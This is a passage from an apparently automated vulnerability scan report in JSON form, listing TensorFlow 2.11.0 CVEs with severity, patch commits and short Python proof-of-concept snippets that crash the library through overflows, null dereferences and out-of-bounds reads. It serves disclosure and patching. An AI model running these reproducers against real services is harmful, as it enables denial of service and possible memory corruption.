                "markdown": "**Vulnerability CVE-2023-25667**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.11.1|[CVE-2023-25667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25667)|\n\n### Impact\nInteger overflow occurs when 2^31 \u003c= num_frames * height * width * channels \u003c 2^32, for example Full HD screencast of at least 346 frames.\n```python\nimport urllib.request\ndat = urllib.request.urlopen(`https://raw.githubusercontent.com/tensorflow/tensorflow/1c38ad9b78ffe06076745a1ee00cec42f39ff726/tensorflow/core/lib/gif/testdata/3g_multiframe.gif`).read()\nimport tensorflow as tf\ntf.io.decode_gif(dat)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d](https://github.com/tensorflow/tensorflow/commit/8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Andrei\n"
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2023-25662",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25662"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25662",
              "help": {
                "text": "Vulnerability CVE-2023-25662\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25662)\n### Impact\nTFversion 2.11.0 //tensorflow/core/ops/array_ops.cc:1067 const Tensor* hypothesis_shape_t = c-\u003einput_tensor(2); std::vector\u003cDimensionHandle\u003e dims(hypothesis_shape_t-\u003eNumElements() - 1); for (int i = 0; i \u003c dims.size(); ++i) { dims[i] = c-\u003eMakeDim(std::max(h_values(i), t_values(i))); }\n\nif hypothesis_shape_t is empty, hypothesis_shape_t-\u003eNumElements() - 1 will be integer overflow, and the it will deadlock\n```python\nimport tensorflow as tf\npara={\n    `hypothesis_indices`: [[]],\n    `hypothesis_values`: [`tmp/`],\n    `hypothesis_shape`: [],\n    `truth_indices`: [[]],\n    `truth_values`: [``],\n    `truth_shape`: [],\n    `normalize`: False\n    }\ntf.raw_ops.EditDistance(**para)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [08b8e18643d6dcde00890733b270ff8d9960c56c](https://github.com/tensorflow/tensorflow/commit/08b8e18643d6dcde00890733b270ff8d9960c56c).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx",
                "markdown": "**Vulnerability CVE-2023-25662**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25662)|\n\n### Impact\nTFversion 2.11.0 //tensorflow/core/ops/array_ops.cc:1067 const Tensor* hypothesis_shape_t = c-\u003einput_tensor(2); std::vector\u003cDimensionHandle\u003e dims(hypothesis_shape_t-\u003eNumElements() - 1); for (int i = 0; i \u003c dims.size(); ++i) { dims[i] = c-\u003eMakeDim(std::max(h_values(i), t_values(i))); }\n\nif hypothesis_shape_t is empty, hypothesis_shape_t-\u003eNumElements() - 1 will be integer overflow, and the it will deadlock\n```python\nimport tensorflow as tf\npara={\n    `hypothesis_indices`: [[]],\n    `hypothesis_values`: [`tmp/`],\n    `hypothesis_shape`: [],\n    `truth_indices`: [[]],\n    `truth_values`: [``],\n    `truth_shape`: [],\n    `normalize`: False\n    }\ntf.raw_ops.EditDistance(**para)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [08b8e18643d6dcde00890733b270ff8d9960c56c](https://github.com/tensorflow/tensorflow/commit/08b8e18643d6dcde00890733b270ff8d9960c56c).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25668",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25668"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25668",
              "help": {
                "text": "Vulnerability CVE-2023-25668\nSeverity: critical\nFixed Version: 2.11.1\nLink: [CVE-2023-25668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25668)\n### Impact\nAttackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.\nWhen axis is larger than the dim of input, c-\u003eDim(input,axis) goes out of bound.\nSame problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\n    \t\t\t\t\t\t\t\t   signed_input=True,\n    \t\t\t\t\t\t\t\t   num_bits=1,\n    \t\t\t\t\t\t\t\t   range_given=True,\n    \t\t\t\t\t\t\t\t   round_mode=`HALF_TO_EVEN`,\n    \t\t\t\t\t\t\t\t   narrow_range=True,\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\ntest()\n```\n\n\n\n### Patches\nWe have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n",
                "markdown": "**Vulnerability CVE-2023-25668**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|2.11.1|[CVE-2023-25668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25668)|\n\n### Impact\nAttackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.\nWhen axis is larger than the dim of input, c-\u003eDim(input,axis) goes out of bound.\nSame problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\n    \t\t\t\t\t\t\t\t   signed_input=True,\n    \t\t\t\t\t\t\t\t   num_bits=1,\n    \t\t\t\t\t\t\t\t   range_given=True,\n    \t\t\t\t\t\t\t\t   round_mode=`HALF_TO_EVEN`,\n    \t\t\t\t\t\t\t\t   narrow_range=True,\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\ntest()\n```\n\n\n\n### Patches\nWe have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n"
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2023-25673",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25673"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25673",
              "help": {
                "text": "Vulnerability CVE-2023-25673\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25673)\n### Impact\nFPE in TensorListSplit with XLA \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.TensorListSplit\npara = {`tensor`: [1], `element_shape`: -1, `lengths`: [0]}\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n y = func(**para)\n return y\n\nprint(fuzz_jit())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx",
                "markdown": "**Vulnerability CVE-2023-25673**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25673)|\n\n### Impact\nFPE in TensorListSplit with XLA \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.TensorListSplit\npara = {`tensor`: [1], `element_shape`: -1, `lengths`: [0]}\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n y = func(**para)\n return y\n\nprint(fuzz_jit())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25676",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25676"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25676",
              "help": {
                "text": "Vulnerability CVE-2023-25676\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25676)\n### Impact\nWhen running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.\n\n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.ParallelConcat\npara = {`shape`:  0, `values`: [1]}\n\n@tf.function(jit_compile=True)\ndef test():\n   y = func(**para)\n   return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [da66bc6d5ff466aee084f9e7397980a24890cd15](https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n",
                "markdown": "**Vulnerability CVE-2023-25676**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25676)|\n\n### Impact\nWhen running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.\n\n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.ParallelConcat\npara = {`shape`:  0, `values`: [1]}\n\n@tf.function(jit_compile=True)\ndef test():\n   y = func(**para)\n   return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [da66bc6d5ff466aee084f9e7397980a24890cd15](https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25672",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25672"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25672",
              "help": {
                "text": "Vulnerability CVE-2023-25672\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25672)\n### Impact\nThe function `tf.raw_ops.LookupTableImportV2` cannot handle scalars in the `values` parameter and gives an NPE.\n\n```python\nimport tensorflow as tf\n\nv = tf.Variable(1)\n\n@tf.function(jit_compile=True)\ndef test():\n   func = tf.raw_ops.LookupTableImportV2\n   para={`table_handle`: v.handle,`keys`: [62.98910140991211, 94.36528015136719], `values`: -919}\n\n   y = func(**para)\n   return y\n\nprint(test())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [980b22536abcbbe1b4a5642fc940af33d8c19b69](https://github.com/tensorflow/tensorflow/commit/980b22536abcbbe1b4a5642fc940af33d8c19b69).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n",
                "markdown": "**Vulnerability CVE-2023-25672**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25672)|\n\n### Impact\nThe function `tf.raw_ops.LookupTableImportV2` cannot handle scalars in the `values` parameter and gives an NPE.\n\n```python\nimport tensorflow as tf\n\nv = tf.Variable(1)\n\n@tf.function(jit_compile=True)\ndef test():\n   func = tf.raw_ops.LookupTableImportV2\n   para={`table_handle`: v.handle,`keys`: [62.98910140991211, 94.36528015136719], `values`: -919}\n\n   y = func(**para)\n   return y\n\nprint(test())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [980b22536abcbbe1b4a5642fc940af33d8c19b69](https://github.com/tensorflow/tensorflow/commit/980b22536abcbbe1b4a5642fc940af33d8c19b69).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25659",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25659"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25659",
              "help": {
                "text": "Vulnerability CVE-2023-25659\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25659)\n### Impact\nIf the parameter `indices` for `DynamicStitch` does not match the shape of the parameter `data`, it can trigger an stack OOB read.\n\n```python\nimport tensorflow as tf\nfunc = tf.raw_ops.DynamicStitch\npara={`indices`: [[0xdeadbeef], [405], [519], [758], [1015]], `data`: [[110.27793884277344], [120.29475402832031], [157.2418212890625], [157.2626953125], [188.45382690429688]]}\ny = func(**para)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ee004b18b976eeb5a758020af8880236cd707d05](https://github.com/tensorflow/tensorflow/commit/ee004b18b976eeb5a758020af8880236cd707d05).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis has been reported via Google OSS VRP.",
                "markdown": "**Vulnerability CVE-2023-25659**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25659)|\n\n### Impact\nIf the parameter `indices` for `DynamicStitch` does not match the shape of the parameter `data`, it can trigger an stack OOB read.\n\n```python\nimport tensorflow as tf\nfunc = tf.raw_ops.DynamicStitch\npara={`indices`: [[0xdeadbeef], [405], [519], [758], [1015]], `data`: [[110.27793884277344], [120.29475402832031], [157.2418212890625], [157.2626953125], [188.45382690429688]]}\ny = func(**para)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ee004b18b976eeb5a758020af8880236cd707d05](https://github.com/tensorflow/tensorflow/commit/ee004b18b976eeb5a758020af8880236cd707d05).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis has been reported via Google OSS VRP."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25669",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25669"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25669",
              "help": {
                "text": "Vulnerability CVE-2023-25669\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25669)\n### Impact\nIf the stride and window size are not positive for `tf.raw_ops.AvgPoolGrad`, it can give an FPE.\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\n@tf.function(jit_compile=True)\ndef test():\n   y = tf.raw_ops.AvgPoolGrad(orig_input_shape=[1,0,0,0], grad=[[[[0.39117979]]]], ksize=[1,0,0,0], strides=[1,0,0,0], padding=\"SAME\", data_format=\"NCHW\")\n   return y\n\nprint(test())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [1295ae4dbb52fe06b19733b0257e2340d7b63b8d](https://github.com/tensorflow/tensorflow/commit/1295ae4dbb52fe06b19733b0257e2340d7b63b8d).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n",
                "markdown": "**Vulnerability CVE-2023-25669**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25669)|\n\n### Impact\nIf the stride and window size are not positive for `tf.raw_ops.AvgPoolGrad`, it can give an FPE.\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\n@tf.function(jit_compile=True)\ndef test():\n   y = tf.raw_ops.AvgPoolGrad(orig_input_shape=[1,0,0,0], grad=[[[[0.39117979]]]], ksize=[1,0,0,0], strides=[1,0,0,0], padding=\"SAME\", data_format=\"NCHW\")\n   return y\n\nprint(test())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [1295ae4dbb52fe06b19733b0257e2340d7b63b8d](https://github.com/tensorflow/tensorflow/commit/1295ae4dbb52fe06b19733b0257e2340d7b63b8d).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25666",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25666"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25666",
              "help": {
                "text": "Vulnerability CVE-2023-25666\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25666](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25666)\n### Impact\nversion:2.11.0 //core/ops/audio_ops.cc:70\n\nStatus SpectrogramShapeFn(InferenceContext* c) { ShapeHandle input; TF_RETURN_IF_ERROR(c-\u003eWithRank(c-\u003einput(0), 2, \u0026input)); int32_t window_size; TF_RETURN_IF_ERROR(c-\u003eGetAttr(\"window_size\", \u0026window_size)); int32_t stride; TF_RETURN_IF_ERROR(c-\u003eGetAttr(\"stride\", \u0026stride)); .....[1]\n\nDimensionHandle input_length = c-\u003eDim(input, 0); DimensionHandle input_channels = c-\u003eDim(input, 1);\n\nDimensionHandle output_length; if (!c-\u003eValueKnown(input_length)) { output_length = c-\u003eUnknownDim(); } else { const int64_t input_length_value = c-\u003eValue(input_length); const int64_t length_minus_window = (input_length_value - window_size); int64_t output_length_value; if (length_minus_window \u003c 0) { output_length_value = 0; } else { output_length_value = 1 + (length_minus_window / stride); .....[2] } output_length = c-\u003eMakeDim(output_length_value); }\n\nGet the value of stride at [1], and the used at [2]\n```python\nimport tensorflow as tf\n\npara = {`input`: tf.constant([[14.], [24.]], dtype=tf.float32), `window_size`: 1, `stride`: 0, `magnitude_squared`: False}\nfunc = tf.raw_ops.AudioSpectrogram\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n   y = func(**para)\n   return y\n\nfuzz_jit()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14](https://github.com/tensorflow/tensorflow/commit/d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n",
                "markdown": "**Vulnerability CVE-2023-25666**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25666](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25666)|\n\n### Impact\nversion:2.11.0 //core/ops/audio_ops.cc:70\n\nStatus SpectrogramShapeFn(InferenceContext* c) { ShapeHandle input; TF_RETURN_IF_ERROR(c-\u003eWithRank(c-\u003einput(0), 2, \u0026input)); int32_t window_size; TF_RETURN_IF_ERROR(c-\u003eGetAttr(\"window_size\", \u0026window_size)); int32_t stride; TF_RETURN_IF_ERROR(c-\u003eGetAttr(\"stride\", \u0026stride)); .....[1]\n\nDimensionHandle input_length = c-\u003eDim(input, 0); DimensionHandle input_channels = c-\u003eDim(input, 1);\n\nDimensionHandle output_length; if (!c-\u003eValueKnown(input_length)) { output_length = c-\u003eUnknownDim(); } else { const int64_t input_length_value = c-\u003eValue(input_length); const int64_t length_minus_window = (input_length_value - window_size); int64_t output_length_value; if (length_minus_window \u003c 0) { output_length_value = 0; } else { output_length_value = 1 + (length_minus_window / stride); .....[2] } output_length = c-\u003eMakeDim(output_length_value); }\n\nGet the value of stride at [1], and the used at [2]\n```python\nimport tensorflow as tf\n\npara = {`input`: tf.constant([[14.], [24.]], dtype=tf.float32), `window_size`: 1, `stride`: 0, `magnitude_squared`: False}\nfunc = tf.raw_ops.AudioSpectrogram\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n   y = func(**para)\n   return y\n\nfuzz_jit()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14](https://github.com/tensorflow/tensorflow/commit/d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25665",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25665"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25665",
              "help": {
                "text": "Vulnerability CVE-2023-25665\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25665)\n### Impact\nWhen `SparseSparseMaximum` is given invalid sparse tensors as inputs, it can give an NPE. \n\n```python\nimport tensorflow as tf\ntf.raw_ops.SparseSparseMaximum(\n a_indices=[[1]],\n a_values =[ 0.1 ],\n a_shape = [2],\n b_indices=[[]],\n b_values =[2 ],\n b_shape = [2],\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04](https://github.com/tensorflow/tensorflow/commit/5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team",
                "markdown": "**Vulnerability CVE-2023-25665**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25665)|\n\n### Impact\nWhen `SparseSparseMaximum` is given invalid sparse tensors as inputs, it can give an NPE. \n\n```python\nimport tensorflow as tf\ntf.raw_ops.SparseSparseMaximum(\n a_indices=[[1]],\n a_values =[ 0.1 ],\n a_shape = [2],\n b_indices=[[]],\n b_values =[2 ],\n b_shape = [2],\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04](https://github.com/tensorflow/tensorflow/commit/5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25671",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25671"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25671",
              "help": {
